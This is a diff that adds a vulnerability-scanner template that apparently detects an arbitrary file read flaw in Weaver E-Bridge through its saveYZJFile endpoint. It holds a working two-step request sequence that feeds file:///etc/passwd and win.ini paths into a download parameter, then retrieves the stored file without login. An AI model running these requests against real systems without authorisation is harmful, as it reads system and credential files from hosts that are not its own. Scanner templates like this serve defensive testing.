@@ -1,0 +1,54 @@
+id: weaver-ebridge-saveyzjfile-read
+
+info:
+  name: Arbitrary File Read in Weaver E-Bridge (saveYZJFile Endpoint)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,weaver-ebridge
+  description: |
+    This template detects arbitrary file read vulnerabilities in Weaver E-Bridge application via the /wxjsapi/saveYZJFile endpoint.
+
+variables:
+  r_data_linux:
+    - "file:///etc/passwd"
+    - "file:///C://windows/win.ini"
+
+http:
+  - id: file-read-init
+    method: GET
+    path:
+      - "/wxjsapi/saveYZJFile?fileName=test&downloadUrl={{r_data_linux}}&fileExt=txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"filepath\""
+          - "\"id\""
+        part: body
+    extractors:
+      - type: regex
+        name: file_id
+        internal: true
+        part: body
+        regex:
+          - "\"id\":\"(?P<id>.*?)\""
+
+  - id: file-read-check
+    method: GET
+    path:
+      - "/file/fileNoLogin/{{file_id}}"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        part: body
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
